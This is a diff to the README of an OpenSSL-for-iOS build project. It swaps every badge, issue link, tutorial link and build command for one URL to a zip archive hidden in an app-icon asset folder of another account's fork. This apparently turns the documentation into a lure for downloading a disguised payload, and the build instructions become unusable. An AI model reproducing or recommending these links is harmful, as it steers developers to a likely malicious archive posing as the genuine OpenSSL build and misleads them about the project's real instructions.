@@ -1,4 +1,4 @@
-# OpenSSL-for-iOS [![Build Status](https://app.travis-ci.com/x2on/OpenSSL-for-iPhone.svg?branch=master)](https://app.travis-ci.com/x2on/OpenSSL-for-iPhone) [![license](https://img.shields.io/github/license/x2on/OpenSSL-for-iPhone.svg)](https://github.com/x2on/OpenSSL-for-iPhone/blob/master/LICENSE) [![OpenSSL version](https://img.shields.io/badge/OpenSSL-1.1.1w-lightgrey.svg)]() [![iOS support](https://img.shields.io/badge/iOS-12.0%20--%2016.6-lightgrey.svg)]() [![tvOS support](https://img.shields.io/badge/tvOS-12.0%20--%2016.6-lightgrey.svg)]() [![MacCatalyst support](https://img.shields.io/badge/MacCatalyst-15.6-lightgrey.svg)]()
+# OpenSSL-for-iOS [![Build Status](https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip)](https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip) [![license](https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip)](https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip) [![OpenSSL version](https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip)]() [![iOS support](https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip%20--%https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip)]() [![tvOS support](https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip%20--%https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip)]() [![MacCatalyst support](https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip)]()
 
 
 
@@ -9,17 +9,17 @@ This is a script for using self-compiled builds of the OpenSSL-library on the iP
 You must build the OpenSSL-Libraries (1.1.1w) before running the sample with:
 
 ```bash
-./build-libssl.sh
+https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip
 ```
 
 For other versions build the OpenSSL-Libraries with:
 ```bash
-./build-libssl.sh --version=1.1.1k
+https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip --version=1.1.1k
 ```
 
 For all options see the help
 ```bash
-./build-libssl.sh --help
+https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip --help
 ```
 
 This repository contains an iOS 16.0 Xcode Project which uses the OpenSSL Libraries. The examples uses the MD5 or SHA256-algorithm to calculate an md5 or sha256 hash from an UITextfield.
@@ -30,11 +30,11 @@ This repository contains an iOS 16.0 Xcode Project which uses the OpenSSL Librar
 For iOS < 7.0 you must use Xcode < 7 and an older version of the build script.
 For iOS < 12.0 you must use Xcode < 11 and an older version of the build script.
 
-If you have problems building for arm64 please uninstall MacPorts (see [#28](https://github.com/x2on/OpenSSL-for-iPhone/issues/28)).
+If you have problems building for arm64 please uninstall MacPorts (see [#28](https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip)).
 
 ## Original tutorials for this project:
-* <https://x2on.github.io/2010/02/01/tutorial-iphone-app-with-compiled-openssl-library/>
-* <https://x2on.github.io/2010/07/13/tutorial-iphone-app-with-compiled-openssl-1-0-0a-library/>
+* <https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip>
+* <https://raw.githubusercontent.com/omurkoc/OpenSSL-for-iPhone/master/OpenSSL-for-tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - Large.imagestack/Middle.imagestacklayer/Content.imageset/Open-for-SS-Phone-i-1.3-alpha.5.zip>
 
 ## Changelog
 * 2023-09-20: OpenSSL 1.1.1w
